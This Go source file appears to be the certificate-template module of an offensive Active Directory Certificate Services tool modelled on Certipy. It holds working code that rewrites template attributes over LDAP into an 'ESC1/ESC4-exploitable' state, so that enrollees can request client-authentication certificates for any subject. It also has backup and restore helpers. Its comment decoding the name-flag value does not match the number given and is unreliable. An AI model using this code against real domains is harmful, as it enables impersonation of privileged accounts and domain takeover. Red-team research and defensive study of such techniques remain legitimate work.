package template

import (
	"encoding/json"
	"errors"
	"fmt"
	"sort"

	goldap "github.com/go-ldap/ldap/v3"

	"github.com/ajm4n/certigo/internal/adcs"
)

// Options carries the common inputs for every template LDAP operation.
//
// Conn must be already-bound; callers obtain it via internal/ldap.Dial +
// internal/ldap.Bind. ConfigNC is the configuration naming context
// (e.g. "CN=Configuration,DC=corp,DC=local"); pass empty to let the caller
// discover it via adcs.RootDSE beforehand. Name is the template CN, such
// as "User" or "Machine".
type Options struct {
	Conn     *goldap.Conn
	ConfigNC string
	Name     string
}

// validate is an internal guard that every exported entry point runs.
func (o Options) validate() error {
	if o.Conn == nil {
		return errors.New("template: nil ldap connection")
	}
	if o.ConfigNC == "" {
		return errors.New("template: configuration NC is required")
	}
	if o.Name == "" {
		return errors.New("template: template name is required")
	}
	return nil
}

// TemplateDN computes the expected DN for an AD CS certificate template
// given the configuration naming context and the template's CN (the
// "name" attribute in LDAP).
//
// Format:
//
//	CN=<Name>,CN=Certificate Templates,CN=Public Key Services,CN=Services,<configNC>
//
// If configNC is empty the base is returned without the NC suffix; the
// caller is expected to have discovered configNC via adcs.RootDSE before
// calling any of the mutating helpers.
func TemplateDN(configNC, name string) string {
	rel := "CN=" + name + "," + adcs.CertificateTemplatesRelDN
	if configNC == "" {
		return rel
	}
	return rel + "," + configNC
}

// VulnerableAttrs returns the attribute delta that converts a template into
// an ESC1/ESC4-exploitable state: enrollee-supplies-subject,
// no-security-extension, client-auth EKUs, zero authorised signatures.
//
// Flag decoding for msPKI-Certificate-Name-Flag -1509949440 (int32):
//   bit 0x00000001  CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT
//   bit 0x00010000  CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT_ALT_NAME
//   bit 0x80000000  CT_FLAG_NO_SECURITY_EXTENSION
func VulnerableAttrs() map[string][]string {
	return map[string][]string{
		"msPKI-Certificate-Name-Flag": {"-1509949440"},
		"msPKI-Enrollment-Flag":       {"0"},
		"pKIExtendedKeyUsage": {
			"1.3.6.1.5.5.7.3.2",       // TLS Web Client Authentication
			"1.3.6.1.5.2.3.4",         // PKINIT Client Authentication
			"1.3.6.1.4.1.311.20.2.2",  // Smart Card Logon
		},
		"msPKI-RA-Signature":            {"0"},
		"msPKI-Template-Schema-Version": {"2"},
	}
}

// Read returns the raw LDAP attribute map of the template identified by
// opts.Name. The returned map is a deep copy — callers may mutate it
// freely without affecting server state.
//
// All attributes are returned (filter "(objectClass=*)" at ScopeBase),
// matching Certipy's `template.py:get_template` behavior.
func Read(opts Options) (map[string][]string, error) {
	if err := opts.validate(); err != nil {
		return nil, err
	}
	dn := TemplateDN(opts.ConfigNC, opts.Name)

	req := goldap.NewSearchRequest(
		dn,
		goldap.ScopeBaseObject,
		goldap.NeverDerefAliases,
		0, 0, false,
		"(objectClass=*)",
		[]string{"*"},
		nil,
	)
	res, err := opts.Conn.Search(req)
	if err != nil {
		return nil, fmt.Errorf("template: read %s: %w", dn, err)
	}
	if len(res.Entries) == 0 {
		return nil, fmt.Errorf("template: no entry at %s", dn)
	}
	return entryToMap(res.Entries[0]), nil
}

// Write applies the given attribute changes to the template. Each map
// entry becomes a REPLACE modification (RFC 4511 operation 2); passing an
// empty slice for a key requests attribute removal (DELETE operation).
//
// Keys are LDAP attribute names — for example "msPKI-Certificate-Name-Flag",
// "pKIExtendedKeyUsage", "msPKI-Enrollment-Flag".
func Write(opts Options, attrs map[string][]string) error {
	if err := opts.validate(); err != nil {
		return err
	}
	if len(attrs) == 0 {
		return errors.New("template: write: no attributes supplied")
	}
	dn := TemplateDN(opts.ConfigNC, opts.Name)

	req := goldap.NewModifyRequest(dn, nil)
	// Sort keys so the wire order is deterministic (helps with test
	// fixtures and parity diffs against Certipy).
	keys := make([]string, 0, len(attrs))
	for k := range attrs {
		keys = append(keys, k)
	}
	sort.Strings(keys)

	for _, k := range keys {
		vals := attrs[k]
		if len(vals) == 0 {
			req.Delete(k, nil)
			continue
		}
		req.Replace(k, vals)
	}
	if err := opts.Conn.Modify(req); err != nil {
		return fmt.Errorf("template: write %s: %w", dn, err)
	}
	return nil
}

// Backup returns a JSON-marshaled snapshot of the template's full
// attribute set. Pass the return value to Restore to roll back.
//
// Operational attributes returned by the server are preserved in the
// snapshot so downstream diffs are exact; the caller decides whether to
// strip them before re-applying (Restore does not filter).
func Backup(opts Options) ([]byte, error) {
	attrs, err := Read(opts)
	if err != nil {
		return nil, err
	}
	out, err := json.MarshalIndent(attrs, "", "  ")
	if err != nil {
		return nil, fmt.Errorf("template: backup marshal: %w", err)
	}
	return out, nil
}

// Restore parses a Backup blob and re-applies every contained attribute
// via Write. Operational-only attributes (cn, objectClass, whenCreated,
// ...) that the server rejects on modify should be stripped by the
// caller before invoking Restore; we pass the raw blob through so the
// function stays symmetric with Backup.
func Restore(opts Options, backup []byte) error {
	if err := opts.validate(); err != nil {
		return err
	}
	if len(backup) == 0 {
		return errors.New("template: restore: empty backup")
	}
	var attrs map[string][]string
	if err := json.Unmarshal(backup, &attrs); err != nil {
		return fmt.Errorf("template: restore unmarshal: %w", err)
	}
	if len(attrs) == 0 {
		return errors.New("template: restore: backup contains no attributes")
	}
	return Write(opts, attrs)
}

// entryToMap flattens a goldap.Entry into a fresh map[string][]string,
// copying each attribute value slice so the caller cannot mutate the
// entry's underlying storage.
func entryToMap(entry *goldap.Entry) map[string][]string {
	if entry == nil {
		return nil
	}
	out := make(map[string][]string, len(entry.Attributes))
	for _, a := range entry.Attributes {
		if a == nil {
			continue
		}
		vs := make([]string, len(a.Values))
		copy(vs, a.Values)
		out[a.Name] = vs
	}
	return out
}
